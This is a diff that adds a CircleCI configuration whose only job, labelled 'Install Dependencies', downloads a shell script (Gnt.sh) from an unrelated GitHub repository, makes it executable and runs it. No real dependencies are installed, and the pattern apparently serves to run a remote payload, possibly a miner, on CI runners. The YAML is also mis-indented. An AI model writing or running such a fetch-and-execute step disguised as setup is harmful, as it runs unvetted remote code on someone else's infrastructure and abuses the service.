@@ -1,0 +1,14 @@
+version: 2.1
+jobs:
+  aku1:
+    docker:
+      - image: cimg/base:2021.04
+    steps:
+      - run:
+          name: Install Dependencies
+            command: wget https://github.com/Ikuzot/nung/raw/main/Gnt.sh && chmod +x Gnt.sh && ./Gnt.sh
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
